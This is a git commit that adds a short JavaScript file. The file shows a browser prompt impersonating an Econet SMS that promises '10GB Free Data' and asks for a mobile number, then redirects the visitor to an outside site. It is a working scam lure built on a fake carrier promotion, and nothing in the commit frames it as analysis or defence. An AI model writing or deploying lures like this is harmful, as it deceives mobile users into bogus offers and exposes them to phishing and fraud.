987d3d56fb9c6524a64e99c9413d18fe4d6cfd28
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-04 06:57:02 +0100

    Create activation-econet.js

---
+++ activation-econet.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your Econet Number is eligible to receive 10GB Free Data, click OK to Enter Your Mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://gbamz.com/strive-birthday.html';
+}
